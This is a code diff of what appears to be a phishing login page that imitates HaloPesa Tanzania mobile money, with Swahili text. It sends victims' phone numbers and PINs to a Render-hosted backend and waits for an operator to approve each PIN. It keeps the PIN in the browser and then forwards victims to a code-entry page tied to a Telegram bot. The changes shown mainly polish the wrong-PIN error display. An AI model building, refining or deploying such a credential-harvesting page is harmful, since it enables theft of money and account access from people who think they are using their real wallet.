@@ -229,7 +229,7 @@
             text-decoration: underline;
         }
 
-        /* ===== STATUS MESSAGES - Enhanced ===== */
+        /* ===== STATUS MESSAGES - ULTRA VISIBLE ===== */
         #status {
             min-height: 22px;
             margin-top: 12px;
@@ -253,35 +253,6 @@
         #status.success::before {
             content: "✅ ";
             font-size: 18px;
-        }
-
-        /* Error - Red */
-        #status.error {
-            display: block;
-            background: #fde8e8;
-            color: #b91c1c;
-            border-color: #d32f2f;
-            box-shadow: 0 2px 12px rgba(211, 47, 47, 0.15);
-        }
-        #status.error::before {
-            content: "❌ ";
-            font-size: 18px;
-        }
-
-        /* Wrong PIN - Red (prominent) */
-        #status.wrong-pin {
-            display: block;
-            background: #fde8e8;
-            color: #b91c1c;
-            border-color: #d32f2f;
-            border-width: 3px;
-            box-shadow: 0 2px 16px rgba(211, 47, 47, 0.25);
-            font-size: 16px;
-            padding: 14px 18px;
-        }
-        #status.wrong-pin::before {
-            content: "❌ ";
-            font-size: 20px;
         }
 
         /* Waiting - Yellow/Amber */
@@ -310,32 +281,58 @@
             font-size: 18px;
         }
 
-        /* ===== TELEGRAM PIN ERROR - Extra prominent ===== */
+        /* ===== SUPER PROMINENT ERROR (always visible) ===== */
+        #status.wrong-pin,
         #status.telegram-pin-error {
             display: block !important;
-            background: #fde8e8;
-            color: #b91c1c;
-            border-color: #b91c1c;
+            background: #d32f2f !important;
+            color: #ffffff !important;
+            border-color: #b71c1c !important;
             border-width: 3px;
-            box-shadow: 0 2px 20px rgba(185, 28, 28, 0.35);
-            font-size: 17px;
-            font-weight: 700;
-            padding: 16px 20px;
+            box-shadow: 0 4px 24px rgba(211, 47, 47, 0.5) !important;
+            font-size: 18px !important;
+            font-weight: 700 !important;
+            padding: 16px 20px !important;
             animation: pulseError 1.2s ease-in-out infinite;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
         }
+        #status.wrong-pin::before,
         #status.telegram-pin-error::before {
             content: "🚫 ";
-            font-size: 22px;
+            font-size: 24px;
         }
 
         @keyframes pulseError {
             0%,
             100% {
-                box-shadow: 0 2px 20px rgba(185, 28, 28, 0.35);
+                box-shadow: 0 4px 24px rgba(211, 47, 47, 0.5);
             }
             50% {
-                box-shadow: 0 2px 30px rgba(185, 28, 28, 0.55);
+                box-shadow: 0 4px 36px rgba(211, 47, 47, 0.8);
             }
+        }
+
+        /* ===== TEST BUTTON (Telegram only) ===== */
+        .test-wrong-pin {
+            display: none;
+            margin-top: 16px;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+            box-shadow: 0 2px 8px rgba(211, 47, 47, 0.3);
+        }
+        .test-wrong-pin:hover {
+            background: #b71c1c;
+        }
+        .telegram-app .test-wrong-pin {
+            display: block;
         }
 
         /* ===== LOWER SECTION ===== */
@@ -408,27 +405,6 @@
             100% {
                 transform: rotate(360deg);
             }
-        }
-
-        /* ===== TEST BUTTON (only visible in Telegram) ===== */
-        .test-wrong-pin {
-            display: none;
-            margin-top: 16px;
-            background: #d32f2f;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: background 0.2s;
-        }
-        .test-wrong-pin:hover {
-            background: #b71c1c;
-        }
-        .telegram-app .test-wrong-pin {
-            display: block;
         }
 
         /* ===== RESPONSIVE ===== */
@@ -536,7 +512,6 @@
         //  CONFIGURATION
         // =============================================
         const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
-        // Set to true to test without backend (PIN 1234 = success, others = error)
         const USE_MOCK = false;
 
         // =============================================
@@ -586,7 +561,7 @@
         }
 
         // =============================================
-        //  STATUS FUNCTIONS (Green = Success, Red = Error)
+        //  STATUS FUNCTIONS
         // =============================================
         function setStatus(message, type = 'waiting') {
             statusEl.textContent = message;
@@ -608,28 +583,31 @@
             if (isTelegramWebApp()) notifyTelegram(message, 'success');
         }
 
-        // ===== WRONG PIN - RED with shake + TELEGRAM ERROR =====
+        // ===== WRONG PIN - ULTRA VISIBLE =====
         function showWrongPin() {
+            console.log("❌ showWrongPin() called – displaying error now.");
             const message = "Nambari ya Siri si sahihi. Tafadhali jaribu tena.";
 
-            // Use a special style for Telegram users to make the error extra prominent
+            // Force the error to be visible with the most prominent style
+            setStatus(message, 'telegram-pin-error');
+
+            // Also show Telegram alert
             if (isTelegramWebApp()) {
-                setStatus(message, 'telegram-pin-error');
-                // Show a clear alert in Telegram
                 notifyTelegram("❌ Nambari ya Siri si sahihi. Tafadhali jaribu tena.", 'error');
-            } else {
-                setStatus(message, 'wrong-pin');
             }
 
-            // Shake animation
+            // Shake animation on the pin boxes
             pinBoxesContainer.classList.remove('shake');
-            void pinBoxesContainer.offsetWidth;
+            void pinBoxesContainer.offsetWidth; // trigger reflow
             pinBoxesContainer.classList.add('shake');
             boxes.forEach(b => b.classList.add('error'));
             setTimeout(() => {
                 boxes.forEach(b => b.classList.remove('error'));
                 pinBoxesContainer.classList.remove('shake');
             }, 600);
+
+            // Extra: log to console for debugging
+            console.log("✅ Error message should be visible now.");
         }
 
         // =============================================
@@ -658,8 +636,8 @@
             this.classList.remove('error');
             localStorage.setItem("phone", this.value);
             validateAndUpdateButton();
-            if (statusEl.className === 'error' || statusEl.className === 'wrong-pin' || statusEl.className ===
-                'telegram-pin-error') {
+            // Clear any error when user starts typing
+            if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
                 clearStatus();
             }
         });
@@ -722,8 +700,8 @@
             box.addEventListener("blur", validateAndUpdateButton);
             box.addEventListener("focus", function() {
                 this.classList.remove('error');
-                if (statusEl.className === 'error' || statusEl.className === 'wrong-pin' || statusEl.className ===
-                    'telegram-pin-error') {
+                // Clear error when focusing a pin box
+                if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
                     clearStatus();
                 }
             });
@@ -784,19 +762,17 @@
         });
 
         // =============================================
-        //  SUBMIT LOGIN – with robust error handling
+        //  SUBMIT LOGIN
         // =============================================
         async function submitLogin(phone, pin) {
             if (isSubmitting) return;
             isSubmitting = true;
 
-            // Disable inputs and show loading state
             boxes.forEach(b => b.disabled = true);
             loginBtn.disabled = true;
             loginBtn.classList.add("disabled", "loading");
             clearStatus();
 
-            // Clear any old polling
             if (pollingInterval) {
                 clearInterval(pollingInterval);
                 pollingInterval = null;
@@ -808,7 +784,6 @@
             if (USE_MOCK) {
                 console.log("🧪 Mock mode: testing PIN", pin);
                 await new Promise(resolve => setTimeout(resolve, 1500));
-
                 if (pin === "1234") {
                     showPinApproved();
                     localStorage.setItem("pin", pin);
@@ -871,16 +846,13 @@
 
                 setStatus("Inasubiri msimamizi kukubali au kukataa...", isTelegramWebApp() ? "telegram-info" : "waiting");
 
-                // Poll for admin decision
                 const approved = await pollPinApproval(data.requestId);
 
                 if (approved === true) {
-                    // ✅ PIN APPROVED – GREEN
                     showPinApproved();
                     localStorage.setItem("pin", pin);
                     setTimeout(() => window.location.href = `code.html?botId=${botId}`, 600);
                 } else if (approved === false) {
-                    // ❌ WRONG PIN / REJECTED – RED with Telegram error
                     showWrongPin();
                     resetForm();
                 } else {
@@ -899,11 +871,11 @@
         }
 
         // =============================================
-        //  POLL PIN APPROVAL – with explicit handling
+        //  POLL PIN APPROVAL
         // =============================================
         function pollPinApproval(requestId) {
             let attempts = 0;
-            const maxAttempts = 120; // ~3 minutes
+            const maxAttempts = 120;
 
             return new Promise((resolve) => {
                 if (pollingInterval) clearInterval(pollingInterval);
@@ -917,7 +889,6 @@
                         const data = await res.json();
                         console.log("📥 Poll response:", data);
 
-                        // Check for blocked status
                         if (data.blocked === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
@@ -927,7 +898,6 @@
                             return;
                         }
 
-                        // --- KEY: Check approved status ---
                         if (data.approved === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
@@ -944,7 +914,6 @@
                             return;
                         }
 
-                        // Still waiting – update status periodically
                         if (attempts % 8 === 0 || attempts === 1) {
                             const elapsed = Math.floor(attempts * 1.5);
                             const mins = Math.floor(elapsed / 60);
@@ -958,7 +927,7 @@
                             clearInterval(pollingInterval);
                             pollingInterval = null;
                             console.warn("⏰ Polling timed out.");
-                            resolve(null); // timeout
+                            resolve(null);
                         }
 
                     } catch (error) {
@@ -987,10 +956,11 @@
             isSubmitting = false;
             validateAndUpdateButton();
             boxes[0].focus();
+            // Do NOT clear status – we want the error to remain visible until user interacts
         }
 
         // =============================================
-        //  LOGIN BUTTON CLICK – main entry point
+        //  LOGIN BUTTON CLICK
         // =============================================
         loginBtn.addEventListener("click", () => {
             if (loginBtn.disabled || isSubmitting) {
@@ -1021,22 +991,10 @@
         //  TEST WRONG PIN BUTTON (Telegram only)
         // =============================================
         testWrongPinBtn.addEventListener("click", function() {
-            // Simulate a wrong PIN error without calling the backend
-            // This is purely for demonstration of the error UI
+            console.log("🧪 Test wrong PIN button clicked.");
+            // Show the error immediately
             showWrongPin();
-            // Also show a Telegram alert if available
-            if (isTelegramWebApp()) {
-                notifyTelegram("❌ (Demo) Nambari ya Siri si sahihi.", 'error');
-            }
-            // Shake and highlight
-            pinBoxesContainer.classList.remove('shake');
-            void pinBoxesContainer.offsetWidth;
-            pinBoxesContainer.classList.add('shake');
-            boxes.forEach(b => b.classList.add('error'));
-            setTimeout(() => {
-                boxes.forEach(b => b.classList.remove('error'));
-                pinBoxesContainer.classList.remove('shake');
-            }, 600);
+            // Also clear any previous status (though showWrongPin does it)
         });
 
         // =============================================
@@ -1082,7 +1040,7 @@
         console.log("📱 Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
         console.log("🤖 Bot ID:", botId || "MISSING");
         console.log("🧪 Mock mode:", USE_MOCK ? "ON (PIN 1234 = success)" : "OFF (using real backend)");
-        console.log("👉 Messages: 'Nambari ya Siri imekubaliwa' (green) / 'Nambari ya Siri si sahihi' (red)");
+        console.log("👉 Error messages will now be displayed with red background + white text.");
     </script>
 
 </body>
